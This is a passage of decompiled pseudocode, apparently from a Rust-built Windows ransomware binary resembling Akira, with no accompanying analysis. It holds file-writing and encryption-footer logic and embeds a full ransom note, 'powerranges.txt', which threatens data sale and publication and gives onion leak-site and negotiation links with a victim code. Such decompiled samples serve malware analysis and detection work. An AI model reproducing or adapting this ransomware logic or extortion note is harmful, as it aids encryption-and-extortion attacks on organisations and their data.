*(_QWORD *)&RandomBuffer[8] )\n        {\n          v142 = &off_14006A108;\n          v143 = *(LPCWSTR *)&RandomBuffer[24];\n          goto LABEL_329;\n        }\n        if ( *(_QWORD *)&RandomBuffer[16] > *(_QWORD *)&RandomBuffer[8] )\n        {\n          v142 = &off_14006A120;\n          v143 = *(LPCWSTR *)&RandomBuffer[16];\nLABEL_329:\n          sub_14005CE40((__int64)v143, v133, (__int64)v142);\n        }\n        v100 = (WCHAR *)((char *)v129 + *(_QWORD *)&RandomBuffer[16]);\n        *(_QWORD *)&v190[16] = (char *)v129 + *(_QWORD *)&RandomBuffer[16];\n        *((_QWORD *)&v99 + 1) = v199;\n        if ( v199 == v177 && v199 == v100 )\n        {\n          memset(Src, 0, 32);\n          while ( 1 )\n          {\n            sub_140034CE0((__int64)lpNewFileName, v33, Src, 0x20ui64);\n            if ( !lpNewFileName[0] )\n              break;\n            v46 = lpNewFileName[1];\n            switch ( (__int64)lpNewFileName[1] & 3 )\n            {\n              case 0i64:\n                v134 = *((_BYTE *)lpNewFileName[1] + 16);\n                break;\n              case 1i64:\n                v134 = *((_BYTE *)lpNewFileName[1] + 15);\n                break;\n              case 2i64:\n                v134 = sub_14002CBC0(SHIDWORD(lpNewFileName[1]));\n                break;\n              case 3i64:\n                v134 = 0;\n                switch ( HIDWORD(lpNewFileName[1]) )\n                {\n                  case 0:\n                    goto LABEL_242;\n                  case 1:\n                    v134 = 1;\n                    break;\n                  case 2:\n                    v134 = 2;\n                    break;\n                  case 3:\n                    v134 = 3;\n                    break;\n                  case 4:\n                    v134 = 4;\n                    break;\n                  case 5:\n                    v134 = 5;\n                    break;\n                  case 6:\n                    v134 = 6;\n                    break;\n                  case 7:\n                    v134 = 7;\n                    break;\n                  case 8:\n                    v134 = 8;\n                    break;\n                  case 9:\n                    v134 = 9;\n                    break;\n                  case 0xA:\n                    v134 = 10;\n                    break;\n                  case 0xB:\n                    v134 = 11;\n                    break;\n                  case 0xC:\n                    v134 = 12;\n                    break;\n                  case 0xD:\n                    v134 = 13;\n                    break;\n                  case 0xE:\n                    v134 = 14;\n                    break;\n                  case 0xF:\n                    v134 = 15;\n                    break;\n                  case 0x10:\n                    v134 = 16;\n                    break;\n                  case 0x11:\n                    v134 = 17;\n                    break;\n                  case 0x12:\n                    v134 = 18;\n                    break;\n                  case 0x13:\n                    v134 = 19;\n                    break;\n                  case 0x14:\n                    v134 = 20;\n                    break;\n                  case 0x15:\n                    v134 = 21;\n                    break;\n                  case 0x16:\n                    v134 = 22;\n                    break;\n                  case 0x17:\n                    v134 = 23;\n                    break;\n                  case 0x18:\n                    v134 = 24;\n                    break;\n                  case 0x19:\n                    v134 = 25;\n                    break;\n                  case 0x1A:\n                    v134 = 26;\n                    break;\n                  case 0x1B:\n                    v134 = 27;\n                    break;\n                  case 0x1C:\n                    v134 = 28;\n                    break;\n                  case 0x1D:\n                    v134 = 29;\n                    break;\n                  case 0x1E:\n                    v134 = 30;\n                    break;\n                  case 0x1F:\n                    v134 = 31;\n                    break;\n                  case 0x20:\n                    v134 = 32;\n                    break;\n                  case 0x21:\n                    v134 = 33;\n                    break;\n                  case 0x22:\n                    v134 = 34;\n                    break;\n                  case 0x23:\n                    v134 = 35;\n                    break;\n                  case 0x24:\n                    v134 = 36;\n                    break;\n                  case 0x25:\n                    v134 = 37;\n                    break;\n                  case 0x26:\n                    v134 = 38;\n                    break;\n                  case 0x27:\n                    v134 = 39;\n                    break;\n                  case 0x28:\n                    v134 = 40;\n                    break;\n                  default:\n                    v134 = 41;\n                    break;\n                }\n                break;\n            }\nLABEL_242:\n            if ( v134 != 35 )\n              goto LABEL_289;\n            sub_14002B4A0((__int64 *)&lpNewFileName[1]);\n          }\n          v135 = lpNewFileName[1];\n          if ( !lpNewFileName[1] )\n          {\n            v129 = v177;\nLABEL_308:\n            sub_140035AA0((union _LARGE_INTEGER *)Src, v33, 0i64, 0i64);\n            v46 = *(LPCWSTR *)&Src[0];\n            if ( *(_QWORD *)&Src[0] )\n              v46 = (LPCWSTR)*((_QWORD *)&Src[0] + 1);\n            v122 = v199;\n            if ( v46 )\n              goto LABEL_290;\n            sub_140014AB0((__int64)Src, *(__int64 *)v192, (__int64)v129, *(void **)v183, 0xFui64, (__int128 *)v184);\n            if ( *(_QWORD *)&Src[0] )\n            {\n              *(_QWORD *)&RandomBuffer[16] = *(_QWORD *)&Src[1];\n              *(_OWORD *)RandomBuffer = Src[0];\n            }\n            else\n            {\n              *(_QWORD *)RandomBuffer = 0i64;\n            }\n            sub_1400184B5((__int64)Src, RandomBuffer, (__int64)&off_140065CE0);\n            v138 = *(void **)&Src[0];\n            v139 = sub_1400198C0(v33, *(char **)&Src[0], *(unsigned __int64 *)&Src[1]);\n            sub_1400184E5((__int64)v139, (__int64)\"Unable to write data to file\", 28i64, (__int64)&off_140065CF8);\n            sub_14004D22F(v138, *((__int64 *)&Src[0] + 1));\n            sub_14004D22F(*(void **)v192, (__int64)v199);\n            v94 = 0.0;\nLABEL_160:\n            v124 = (unsigned int)(int)v94;\n            if ( v94 < 0.0 )\n              v124 = 0i64;\n            if ( v94 > 1.8446743e19 )\n              v124 = -1i64;\n            lpNewFileName[0] = (LPCWSTR)v124;\n            sub_140035AA0((union _LARGE_INTEGER *)Src, v33, 1i64, 0i64);\n            sub_14001844A(\n              *(__int64 *)&Src[0],\n              *((__int64 *)&Src[0] + 1),\n              (__int64)\"TODO: panic message\",\n              19i64,\n              (__int64)&off_140065D28);\n            *(_QWORD *)RandomBuffer = v124;\n            sub_14002D270((__int64 *)Src, v33, RandomBuffer, 8ui64);\n            sub_140018517(*(__int64 *)&Src[0], *((__int64 *)&Src[0] + 1), (__int64)&off_140065D40);\n            if ( (unsigned __int64)qword_140084AE8 >= 5 )\n            {\n              *(_QWORD *)RandomBuffer = v188;\n              *(_QWORD *)&RandomBuffer[8] = sub_140032A70;\n              *(_QWORD *)&Src[0] = &off_140065D70;\n              *((_QWORD *)&Src[0] + 1) = 2i64;\n              *(_QWORD *)&Src[2] = 0i64;\n              *(_QWORD *)&RandomBuffer[16] = lpNewFileName;\n              *(_QWORD *)&RandomBuffer[24] = sub_14001842B;\n              *(_QWORD *)&Src[1] = RandomBuffer;\n              *((_QWORD *)&Src[1] + 1) = 2i64;\n              sub_14000E7FB((__int64)Src, 5i64, (__int128 *)&off_1400659B0, 106);\n            }\n            *(_OWORD *)&v190[16] = v154[1];\n            *(_OWORD *)v190 = v154[0];\n            if ( (unsigned __int64)qword_140084AE8 >= 5 )\n            {\n              *(_QWORD *)RandomBuffer = v188;\n              *(_QWORD *)&RandomBuffer[8] = sub_140032A70;\n              *(_QWORD *)&Src[0] = &off_140065DB0;\n              *((_QWORD *)&Src[0] + 1) = 2i64;\n              *(_QWORD *)&Src[2] = 0i64;\n              *(_QWORD *)&RandomBuffer[16] = v190;\n              *(_QWORD *)&RandomBuffer[24] = sub_14001A5EB;\n              *(_QWORD *)&Src[1] = RandomBuffer;\n              *((_QWORD *)&Src[1] + 1) = 2i64;\n              sub_14000E7FB((__int64)Src, 5i64, (__int128 *)&off_1400659B0, 109);\n            }\n            sub_14002D270((__int64 *)Src, v33, v190, 0x20ui64);\n            sub_140018517(*(__int64 *)&Src[0], *((__int64 *)&Src[0] + 1), (__int64)&off_140065DD0);\n            sub_14003A120(\n              (__int64)Src,\n              v188[0],\n              v189,\n              \"powerranges.txtHi friends,\\r\\n\"\n              \"Whatever who you are and what your title is if you're reading this it means the internal infrastructure of\"\n              \" your company is fully or partially dead, all your backups - virtual, physical - everything that we manage\"\n              \"d to reach - are completely removed. Moreover, we have taken a great amount of your corporate data prior t\"\n              \"o encryption.\\r\\n\"\n              \"\\r\\n\"\n              \"Well, for now let's keep all the tears and resentment to ourselves and try to build a constructive dialogu\"\n              \"e. We're fully aware of what damage we caused by locking your internal sources. At the moment, you have to\"\n              \" know:\\r\\n\"\n              \"\\r\\n\"\n              \"1. Dealing with us you will save A LOT due to we are not interested in ruining your financially. We will s\"\n              \"tudy in depth your finance, bank & income statements, your savings, investments etc. and present our reaso\"\n              \"nable demand to you. If you have an active cyber insurance, let us know and we will guide you how to prope\"\n              \"rly use it. Also, dragging out the negotiation process will lead to failing of the deal.\\r\\n\"\n              \"2. Paying us you save your TIME, MONEY, EFFORTS and be back on track within 24 hours approximately. Our de\"\n              \"cryptor works properly on any files or systems, so you will be able to check it by requesting a test decry\"\n              \"ption service from the beginning of our conversation. If you decide to recover on your own, keep in mind t\"\n              \"hat you can permanently lose access to some files or accidentally corrupt them - in this case we won't be \"\n              \"able to help.\\r\\n\"\n              \"3. The security report or the exclusive first-hand information that you will receive upon reaching an agre\"\n              \"ement is of great value, since NO full audit of your network will show you the vulnerabilities that we've \"\n              \"managed to detect and use in order to get into, identify backup solutions and download your data.\\r\\n\"\n              \"4. As for your data, if we fail to agree, we will try to sell personal information/trade secrets/databases\"\n              \"/source codes - generally speaking, everything that has a value on the darkmarket - to multiple threat act\"\n              \"ors at once. Then all of this will be published in our blog - https://akiral2iz6a7qgd3ayp3l6yub7xx2uep76id\"\n              \"k3u2kollpj5z3z636bad[.]onion.\\r\\n\"\n              \"5. We're more than negotiable and will definitely find a way to settle this quickly and reach an agreement\"\n              \" which will satisfy both of us.\\r\\n\"\n              \"\\r\\n\"\n              \"If you're indeed interested in our assistance and the services we provide you can reach out to us followin\"\n              \"g simple instructions:\\r\\n\"\n              \"\\r\\n\"\n              \"1. Install TOR Browser to get access to our chat room - https://www.torproject[.]org/download/.\\r\\n\"\n              \"2. Paste this link - https://akiralkzxzq2dsrzsrvbr2xgbbu2wgsmxryd4csgfameg52n7efvr2id[.]onion.\\r\\n\"\n              \"3. Use this code - 3748-FO-SLHG-WOQJ - to log into our chat.\\r\\n\"\n              \"\\r\\n\"\n              \"Keep in mind that the faster you will get in touch, the less damage we cause.note write fail\",\n              0xFui64);\n            v125 = *(void **)&Src[0];\n            v126 = sub_140035760(*(char **)&Src[0], *(__int64 *)&Src[1]);\n            sub_14004D22F(v125, *((__int64 *)&Src[0] + 1));\n            sub_1400184E5((__int64)v126, (__int64)\"note write fail\", 15i64, (__int64)&off_140066888);\n            if ( (unsigned __int64)qword_140084AE8 > 3 )\n            {\n              *(_QWORD *)&Src[0] = &off_1400668B0;\n              *((_QWORD *)&Src[0] + 1) = 1i64;\n              *(_QWORD *)&Src[2] = 0i64;\n              *(_QWORD *)RandomBuffer = v188;\n              *(_QWORD *)&RandomBuffer[8] = sub_140032A70;\n              *(_QWORD *)&Src[1] = RandomBuffer;\n              *((_QWORD *)&Src[1] + 1) = 1i64;\n              sub_14000E7FB((__int64)Src, 4i64, (__int128 *)&off_1400659B0, 112);\n            }\n            v46 = 0i64;\n            goto LABEL_292;\n          }\n          if ( lpNewFileName[1] >= (LPCWSTR)0x21 )\n          {\n            v142 = (char **)&off_14006A138;\n            v133 = 32i64;\n            v143 = lpNewFileName[1];\n            goto LABEL_329;\n          }\n          sub_14005DD90((__int64 *)v190, (__int64)v177, (__int64)lpNewFileName[1]);\n          v199 = *(WCHAR **)&v190[8];\n          v136 = *(_QWORD *)&v190[16];\n          memmove((void *)(*(_QWORD *)&v190[16] + *(_QWORD *)v190), Src, (size_t)v135);\n          *((_QWORD *)&v99 + 1) = v199;\n          v100 = (WCHAR *)((char *)v135 + v136);\n          *(_QWORD *)&v190[16] = v100;\n        }\n        goto LABEL_174;\n      }\n      v46 = (LPCWSTR)v131;\n      switch ( v131 & 3 )\n      {\n        case 0i64:\n          v132 = *(_BYTE *)(v131 + 16);\n          break;\n        case 1i64:\n          v132 = *(_BYTE *)(v131 + 15);\n          break;\n        case 2i64:\n          v132 = sub_14002CBC0(SHIDWORD(v131));\n          break;\n        case 3i64:\n          v132 = 0;\n          switch ( HIDWORD(v46) )\n          {\n            case 0:\n              goto LABEL_186;\n            case 1:\n              v132 = 1;\n              break;\n            case 2:\n              v132 = 2;\n              break;\n            case 3:\n              v132 = 3;\n              break;\n            case 4:\n              v132 = 4;\n              break;\n            case 5:\n              v132 = 5;\n              break;\n            case 6:\n              v132 = 6;\n              break;\n            case 7:\n              v132 = 7;\n              break;\n            case 8:\n              v132 = 8;\n              break;\n            case 9:\n              v132 = 9;\n              break;\n            case 0xA:\n              v132 = 10;\n              break;\n            case 0xB:\n              v132 = 11;\n              break;\n            case 0xC:\n              v132 = 12;\n              break;\n            case 0xD:\n              v132 = 13;\n              break;\n            case 0xE:\n              v132 = 14;\n              break;\n            case 0xF:\n              v132 = 15;\n              break;\n            case 0x10:\n              v132 = 16;\n              break;\n            case 0x11:\n              v132 = 17;\n              break;\n            case 0x12:\n              v132 = 18;\n              break;\n            case 0x13:\n              v132 = 19;\n              break;\n            case 0x14:\n              v132 = 20;\n              break;\n            case 0x15:\n              v132 = 21;\n              break;\n            case 0x16:\n              v132 = 22;\n              break;\n            case 0x17:\n              v132 = 23;\n              break;\n            case 0x18:\n              v132 = 24;\n              break;\n            case 0x19:\n              v132 = 25;\n              break;\n            case 0x1A:\n              v132 = 26;\n              break;\n            case 0x1B:\n              v132 = 27;\n              break;\n            case 0x1C:\n              v132 = 28;\n              break;\n            case 0x1D:\n              v132 = 29;\n              break;\n            case 0x1E:\n              v132 = 30;\n              break;\n            case 0x1F:\n              v132 = 31;\n              break;\n            case 0x20:\n              v132 = 32;\n              break;\n            case 0x21:\n              v132 = 33;\n              break;\n            case 0x22:\n              v132 = 34;\n              break;\n            case 0x23:\n              v132 = 35;\n              break;\n            case 0x24:\n              v132 = 36;\n              break;\n            case 0x25:\n              v132 = 37;\n              break;\n            case 0x26:\n              v132 = 38;\n              break;\n            case 0x27:\n              v132 = 39;\n              break;\n            case 0x28:\n              v132 = 40;\n              break;\n            default:\n              v132 = 41;\n              break;\n          }\n          break;\n      }\nLABEL_186:\n      if ( v132 != 35 )\n        break;\n      *(_QWORD *)&Src[0] = v46;\n      sub_14002B4A0((__int64 *)Src);\n      *((_QWORD *)&v99 + 1) = v199;\n    }\nLABEL_289:\n    v122 = v199;\nLABEL_290:\n    v123 = *(WCHAR **)v192;\nLABEL_291:\n    sub_14004D22F(v123, (__int64)v122);\nLABEL_292:\n    sub_14004D22F((void *)v184, v170);\n    sub_14004D22F(*(void **)v183, v169);\n    sub_14000E13C((__int64)v159);\nLABEL_293:\n    CloseHandle(v33);\n    v33 = (WCHAR *)v46;\nLABEL_294:\n    sub_14004D22F(v158[0], (__int64)v158[1]);\nLABEL_295:\n    sub_14004D22F(v188[0], (__int64)v188[1]);\n    if ( v33 )\n    {\n      lpNewFileName[0] = v33;\n      if ( (unsigned __int64)qword_140084AE8 >= 5 )\n      {\n        sub_140012E68((__int64)RandomBuffer, (__int64)&v179);\n        *(_QWORD *)v190 = lpNewFileName;\n        *(_QWORD *)&v190[8] = sub_140033360;\n        *(_QWORD *)&Src[0] = &off_140065538;\n        *((_QWORD *)&Src[0] + 1) = 2i64;\n        *(_QWORD *)&Src[2] = 0i64;\n        *(_QWORD *)&v190[16] = RandomBuffer;\n        *(_QWORD *)&v190[24] = sub_140032A70;\n        *(_QWORD *)&Src[1] = v190;\n        *((_QWORD *)&Src[1] + 1) = 2i64;\n        sub_14000E7FB((__int64)Src, 5i64, (__int128 *)&off_1400659B0, 145);\n        sub_14004D22F(*(void **)RandomBuffer, *(__int64 *)&RandomBuffer[8]);\n      }\n      if ( (unsigned __int64)qword_140084AE8 >= 5 )\n      {\n        sub_140012E68((__int64)RandomBuffer, (__int64)&v179);\n        *(_QWORD *)v190 = lpNewFileName;\n        *(_QWORD *)&v190[8] = sub_140033360;\n        *(_QWORD *)&Src[0] = &off_140065538;\n        *((_QWORD *)&Src[0] + 1) = 2i64;\n        *(_QWORD *)&Src[2] = 0i64;\n        *(_QWORD *)&v190[16] = RandomBuffer;\n        *(_QWORD *)&v190[24] = sub_140032A70;\n        *(_QWORD *)&Src[1] = v190;\n        *((_QWORD *)&Src[1] + 1) = 2i64;\n        sub_14000E7FB((__int64)Src, 5i64, (__int128 *)&off_1400659B0, 149);\n        sub_14004D22F(*(void **)RandomBuffer, *(__int64 *)&RandomBuffer[8]);\n      }\n      if ( (unsigned __int64)qword_140084AE8 > 4 )\n      {\n        *(_QWORD *)&Src[0] = &off_14006CC28;\n        *((_QWORD *)&Src[0] + 1) = 1i64;\n        *(_QWORD *)&Src[2] = 0i64;\n        *(_QWORD *)RandomBuffer = lpNewFileName;\n        *(_QWORD *)&RandomBuffer[8] = sub_140033360;\n        *(_QWORD *)&Src[1] = RandomBuffer;\n        *((_QWORD *)&Src[1] + 1) = 1i64;\n        sub_14000E7FB((__int64)Src, 5i64, (__int128 *)&off_1400659B0, 150);\n      }\n      v137 = lpNewFileName[0];\n      if ( ((__int64)lpNewFileName[0] & 3) == 1 )\n      {\n        (**(void (__fastcall ***)(_QWORD))((char *)lpNewFileName[0] + 7))(*(_QWORD *)((char *)lpNewFileName[0] - 1));\n        sub_1400013F8(\n          *(void **)((char *)v137 - 1),\n          *(_QWORD *)(*(_QWORD *)((char *)v137 + 7) + 16i64),\n          *(_QWORD *)(*(_QWORD *)((char *)v137 + 7) + 8i64));\n        sub_140006340((char *)v137 - 1, 8ui64);\n      }\n    }\n    if ( (unsigned __int64)qword_140084AE8 > 4 )\n    {\n      *(_QWORD *)&Src[0] = &off_140065568;\n      *((_QWORD *)&Src[0] + 1) = 1i64;\n      *(_QWORD *)&Src[2] = 0i64;\n      *(_QWORD *)RandomBuffer = &v179;\n      *(_QWORD *)&RandomBuffer[8] = sub_140032A70;\n      *(_QWORD *)&Src[1] = RandomBuffer;\n      *((_QWORD *)&Src[1] + 1) = 1i64;\n      sub_14000E7FB((__int64)Src, 5i64, (__int128 *)&off_1400659B0, 153);\n    }\n    sub_14004D22F((void *)v179, *((__int64 *)&v179 + 1));\n    v2 = v173;\n  }\n  sub_14004D22F(v199, v167);\nLABEL_317:\n  if ( (unsigned __int64)qword_140084AE8 >= 5 )\n  {\n    *(_QWORD *)&Src[0] = &off_1400654C8;\n    *((_QWORD *)&Src[0] + 1) = 1i64;\n    *(_QWORD *)&Src[1] = &off_14006CC28;\n    *(__int128 *)((char *)&Src[1] + 8) = 0i64;\n    sub_14000E7FB((__int64)Src, 5i64, (__int128 *)&off_1400659B0, 135);\n  }\n  sub_14004D22F((void *)v179, *((__int64 *)&v179 + 1));\n  return sub_1400010BB(&v173);\n}\n// 1400100AF: variable 'v6' is possibly undefined\n// 14001013C: variable 'v8' is possibly undefined\n// 140010443: variable 'v27' is possibly undefined\n// 140010443: variable 'v26' is possibly undefined\n// 140010551: variable 'v30' is possibly undefined\n// 140010946: variable 'v45' is possibly undefined\n// 140010A5B: variable 'v48' is possibly undefined\n// 140010AE1: variable 'v52' is possibly undefined\n// 140010B0E: variable 'v55' is possibly undefined\n// 1400112F4: variable 'v83' is possibly undefined\n// 140011350: variable 'v86' is possibly undefined\n// 14001140F: variable 'v87' is possibly undefined\n// 1400114AD: variable 'v89' is possibly undefined\n// 140011A42: variable 'v110' is possibly undefined\n// 140011A8C: variable 'v114' is possibly undefined\n// 140011FCF: variable 'v127' is possibly undefined\n// 140064260: using guessed type char *off_140064260;\n// 140064278: using guessed type char *off_140064278;\n// 140064290: using guessed type unsigned __int64 qword_140064290[5];\n// 140065490: using guessed type char *off_140065490;\n// 1400654A8: using guessed type char *off_1400654A8;\n// 1400654C8: using guessed type char *off_1400654C8;\n// 1400654F8: using guessed type char *off_1400654F8;\n// 140065538: using guessed type char *off_140065538;\n// 140065568: using guessed type void *off_140065568;\n// 140065580: using guessed type void *off_140065580;\n// 140065938: using guessed type void **off_140065938;\n// 140065980: using guessed type void *off_140065980;\n// 1400659B0: using guessed type char *off_1400659B0;\n// 140065A60: using guessed type char *off_140065A60;\n// 140065A90: using guessed type void **off_140065A90;\n// 140065AC0: using guessed type char *off_140065AC0;\n// 140065AE8: using guessed type char *off_140065AE8;\n// 140065B38: using guessed type char *off_140065B38;\n// 140065B68: using guessed type char *off_140065B68;\n// 140065B98: using guessed type char *off_140065B98;\n// 140065BE8: using guessed type char *off_140065BE8;\n// 140065C28: using guessed type char *off_140065C28;\n// 140065C40: using guessed type char *off_140065C40;\n// 140065C58: using guessed type char *off_140065C58;\n// 140065C90: using guessed type char *off_140065C90;\n// 140065CC0: using guessed type void **off_140065CC0;\n// 140065CE0: using guessed type char *off_140065CE0;\n// 140065CF8: using guessed type char *off_140065CF8;\n// 140065D28: using guessed type char *off_140065D28;\n// 140065D40: using guessed type char *off_140065D40;\n// 140065D70: using guessed type char *off_140065D70;\n// 140065DB0: using guessed type char *off_140065DB0;\n// 140065DD0: using guessed type char *off_140065DD0;\n// 140066888: using guessed type char *off_140066888;\n// 1400668B0: using guessed type char *off_1400668B0;\n// 140067048: using guessed type void *off_140067048;\n// 1400670E8: using guessed type __int64 (__fastcall *off_1400670E8)();\n// 140067148: using guessed type char *off_140067148;\n// 1400671B8: using guessed type char *off_1400671B8;\n// 14006A108: using guessed type char *off_14006A108;\n// 14006A120: using guessed type char *off_14006A120;\n// 14006A138: using guessed type void *off_14006A138;\n// 14006CC28: using guessed type void *off_14006CC28;\n// 14006CFF0: using guessed type _QWORD qword_14006CFF0[3840];\n// 140084AE8: using guessed type __int64 qword_140084AE8;\n// 14000FFD4: using guessed type unsigned __int64 var_108[6];\n// 14000FFD4: using guessed type unsigned __int64 var_130[5];\n// 14000FFD4: using guessed type unsigned __int64 var_6A0[5];\n// 14000FFD4: using guessed type unsigned __int64 var_6C8[5];\n// 14000FFD4: using guessed type unsigned __int64 var_628[5];\n// 14000FFD4: using guessed type unsigned __int64 var_6F0[5];\n// 14000FFD4: using guessed type unsigned __int64 var_650[5];\n// 14000FFD4: using guessed type unsigned __int64 var_718[5];\n// 14000FFD4: using guessed type unsigned __int64 var_678[5];\n// 14000FFD4: using guessed type _QWORD var_768[5];\n// 14000FFD4: using guessed type __int64 var_790[5];\n\n"
    }
]